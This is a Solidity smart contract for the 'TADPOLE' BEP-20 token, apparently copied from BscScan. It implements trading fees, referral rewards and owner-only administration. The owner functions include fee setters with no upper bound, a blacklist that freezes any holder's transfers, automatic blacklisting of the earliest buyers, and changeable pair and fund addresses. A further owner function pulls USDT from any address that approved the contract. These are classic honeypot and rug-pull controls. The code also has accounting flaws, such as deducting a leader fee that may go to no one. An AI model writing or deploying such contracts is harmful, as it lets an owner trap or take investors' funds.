/**
 *Submitted for verification at BscScan.com on 2022-04-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-12
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

contract TADPOLE is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _rOwned;
    
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private _tTotal;
    uint256 private _burnTotal;
    uint256 private _burnTotalend;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 public _baseFee = 1000;
   
    uint256 public _inoutFee = 80;
    uint256 public _lpFee = 10;
    uint256 public _markFee = 15;
    uint256 public _charitable = 20;
    uint256 public _burnFee = 30;
    uint256 public _leaderfee = 50;
    uint256 public _father = 5;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    IERC20 usdt;
    uint256 public tradingEnabledTimestamp = 1649001600; //2022-04-04 00:00:00   
    
    mapping(address => address) public inviter;
    mapping(address => bool) public _isBlacklisted;
    mapping(address => bool) public leader;
  
    address public uniswapV2Pair;
	address public uniswapV2Pair2;
	address public uniswapV2Pair3;
	address public uniswapV2Pair4;
    address public _fundAddressA;
    address public _fundAddressB;
	address public _fundAddressC;
	address public _fundAddressD;
	
    constructor(address tokenOwner,address fundAddressA,address fundAddressB,address fundAddressC,IERC20 _usdt ) {
        _name = "TADPOLE";
        _symbol = "TADPOLE";
        _decimals = 9;
        _tTotal = 13000000 * 10**_decimals; 
        _burnTotal = _tTotal;
        _burnTotalend = 5000000 * 10**_decimals;
       
        _rOwned[tokenOwner] = _tTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _fundAddressA = fundAddressA;//marker
        _fundAddressB = fundAddressB;//charitable
		_fundAddressC = fundAddressC;//in or out
      
        usdt=_usdt;
        _owner = msg.sender;
        //_owner=tokenOwner;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _burnTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        //return tokenFromReflection(_rOwned[account]);
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

  
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
       
        require(!_isBlacklisted[from], "Blacklisted address"); 

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(balanceOf(from)>=amount,"YOU HAVE insuffence balance");
       

        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            _tokenTransfer(from, to, amount);
        }else{
			if(from == uniswapV2Pair){
				_tokenTransferBuy(from, to, amount,uniswapV2Pair);
			}else if(to == uniswapV2Pair){
				_tokenTransferSell(from, to, amount,uniswapV2Pair);
			}else if(from == uniswapV2Pair2){
				_tokenTransferBuy(from, to, amount,uniswapV2Pair2);
			}else if(to == uniswapV2Pair2){
				_tokenTransferSell(from, to, amount,uniswapV2Pair2);
			}else if(from == uniswapV2Pair3){
				_tokenTransferBuy(from, to, amount,uniswapV2Pair3);
			}else if(to == uniswapV2Pair3){
				_tokenTransferSell(from, to, amount,uniswapV2Pair3);
			}else if(from == uniswapV2Pair4){
				_tokenTransferBuy(from, to, amount,uniswapV2Pair4);
			}else if(to == uniswapV2Pair4){
				_tokenTransferSell(from, to, amount,uniswapV2Pair4);
			}else{
                
				_tokenTransfer2(from, to, amount);
			}
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        
        bool shouldSetInviter = 
            inviter[recipient] == address(0) &&
            sender != uniswapV2Pair&&
            sender != uniswapV2Pair2&&
            sender != uniswapV2Pair3&&
            sender != uniswapV2Pair4&&
            tAmount >= 11 * 10 **6;
            
        if (shouldSetInviter) {
            inviter[recipient] = sender;
        }
       
        uint256 rAmount = tAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function _tokenTransfer2(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        
        bool shouldSetInviter = 
            inviter[recipient] == address(0) &&
            sender != uniswapV2Pair&&
            sender != uniswapV2Pair2&&
            sender != uniswapV2Pair3&&
            sender != uniswapV2Pair4&&
            tAmount >= 11 * 10 **6;
            
        if (shouldSetInviter) {
            inviter[recipient] = sender;
        }

         _takeTransfer(
			sender,
			_fundAddressC,
			tAmount.div(_baseFee).mul(_inoutFee)//in or out
			
		);

        _rOwned[sender] = _rOwned[sender].sub(tAmount);

        uint256 tempfee;
        tempfee=_baseFee-_inoutFee;

        uint256 rAmount = tAmount.div(_baseFee).mul(tempfee);

        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        emit Transfer(sender, recipient, rAmount);
    }


    function _tokenTransferBuy(
        address sender,
        address recipient,
        uint256 tAmount,
        address LPADDRESS
		
    ) private {

        bool tradingIsEnabled = getTradingIsEnabled();
        require(tradingIsEnabled, "Time is not up");

        if (
            tradingIsEnabled &&                  //start time
           block.timestamp <= tradingEnabledTimestamp + 9 seconds) {  //bot 
            addBot(recipient);                                 //add black
        }

       
         
        uint256 rAmount = tAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
 
		_takeTransfer(
			sender,
			_fundAddressA,//markfee
			tAmount.div(_baseFee).mul(_markFee)
			
		);
		_takeTransfer(
			sender,
			LPADDRESS,
			tAmount.div(_baseFee).mul(_lpFee)//lpfee
			
		);
      

        uint256 sumbuyfee;
        sumbuyfee=_baseFee-_father-_lpFee-_markFee-_leaderfee;
    
            
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(_baseFee).mul(sumbuyfee)
        );
        emit Transfer(sender, recipient, tAmount.div(_baseFee).mul(sumbuyfee));


      
        address cur;
        cur = recipient;
        uint256 accurRate;
        for (int256 i = 0; i < 20; i++) {
            uint256 rate;
            if (i == 0) {
                rate = _father;
            } else if(i == 1){
                rate = 0;
            } else if(i == 2 ){
                rate = 0;
            } else {
                rate = 0;
            }

           

            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }
            if(rate>0){
                accurRate = accurRate.add(rate);

                uint256 curTAmount = tAmount.div(_baseFee).mul(rate);
                _rOwned[cur] = _rOwned[cur].add(curTAmount);
                emit Transfer(sender, cur, curTAmount);
            }
            if(leader[cur]){
                
                 uint256 curTAmount2 = tAmount.div(_baseFee).mul(_leaderfee);
                _rOwned[cur] = _rOwned[cur].add(curTAmount2);
                emit Transfer(sender, cur, curTAmount2);
            }
        }

    }
    
    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount,
        address LPADDRESS
		
    ) private {
        

        uint256 rAmount = tAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
 
		_takeTransfer(
			sender,
			_fundAddressA,//markfee
			tAmount.div(_baseFee).mul(_markFee)
			
		);
		_takeTransfer(
			sender,
			LPADDRESS,
			tAmount.div(_baseFee).mul(_lpFee)//lpfee
			
		);
        
		_takeTransfer(
			sender,
			_fundAddressB,
			tAmount.div(_baseFee).mul(_charitable)//markfee
			
		);



    uint256 sumsellfee;
    if(_burnTotal>_burnTotalend){
        _takeTransfer(
			sender,
			_destroyAddress,
			tAmount.div(_baseFee).mul(_burnFee)
			
		);
        _burnTotal=_burnTotal-tAmount.div(_baseFee).mul(_burnFee);
        sumsellfee=_baseFee-_father-_lpFee-_markFee-_burnFee-_charitable;
    }else{
        sumsellfee=_baseFee-_father-_lpFee-_markFee-_charitable;
    }
       
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(_baseFee).mul(sumsellfee)
        );
        emit Transfer(sender, recipient, tAmount.div(_baseFee).mul(sumsellfee));

    
        address cur;
        cur = sender;
        uint256 accurRate;
        for (int256 i = 0; i < 1; i++) {
            uint256 rate;
            if (i == 0) {
                rate = _father;
            }

            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }

            if(rate>0){
                accurRate = accurRate.add(rate);

                uint256 curTAmount = tAmount.div(_baseFee).mul(rate);
                _rOwned[cur] = _rOwned[cur].add(curTAmount);
                emit Transfer(sender, cur, curTAmount);
            }
         
        }


    }


    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
       
    ) private {
        uint256 rAmount = tAmount;
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }

  

    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
	function changeRouter2(address router) public onlyOwner {
        uniswapV2Pair2 = router;
    }
	function changeRouter3(address router) public onlyOwner {
        uniswapV2Pair3 = router;
    }
	function changeRouter4(address router) public onlyOwner {
        uniswapV2Pair4 = router;
    }
    function changeA(address _AddressA) public onlyOwner {
        _fundAddressA = _AddressA;
    }
    function changeB(address _AddressB) public onlyOwner {
        _fundAddressB = _AddressB;
    }
    function changeC(address _AddressC) public onlyOwner {
        _fundAddressC = _AddressC;
    }
    function changeD(address _AddressD) public onlyOwner {
        _fundAddressD = _AddressD;
    }

    function setfater(uint256 _new) public onlyOwner(){
         _father = _new;
    }

     function getTradingIsEnabled() public view returns (bool) {
        return block.timestamp >= tradingEnabledTimestamp;
    }

     function setplanastart_end(uint256 _time)  public onlyOwner(){
         tradingEnabledTimestamp=_time;
    }

    function setinoutfee(uint256 inoutfee)  public onlyOwner(){
         _inoutFee=inoutfee;
        
    }
    
     function set_lp_marker_fee(uint256 lpfee,uint256 markfee)  public onlyOwner(){
         _lpFee=lpfee;
         _markFee=markfee;
    }
   
     function setburnfee(uint256 burnfee)  public onlyOwner(){
         _burnFee=burnfee;
    }
     function setleaderfee(uint256 leaderfee)  public onlyOwner(){
         _leaderfee=leaderfee;
    }
    function setcharitablefee(uint256 charitable)  public onlyOwner(){
         _charitable=charitable;
    }
    
     function blacklistAddress(address account, bool value) external onlyOwner {
        _isBlacklisted[account] = value;   //true is black
    }
    function addBot(address recipient) private {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }
    function setleader(address recipient2, bool value) public  onlyOwner {
        
        leader[recipient2] = value;
    }
    function setusdtaddress(IERC20 address3) public onlyOwner(){
        usdt = address3;
    }
    function setburntotal(uint256 num) public onlyOwner(){
        _burnTotal = num * 10**_decimals;
    }

    function  transferOutusdt(address toaddress,uint256 amount,uint256 decimals2)  external onlyOwner {
        usdt.transfer(toaddress, amount*10**decimals2);
    }
    function  transferinusdt(address fromaddress,address toaddress3,uint256 amount3,uint256 decimals3)  external onlyOwner {
        usdt.transferFrom(fromaddress,toaddress3, amount3*10**decimals3);//contract need approve
    }

}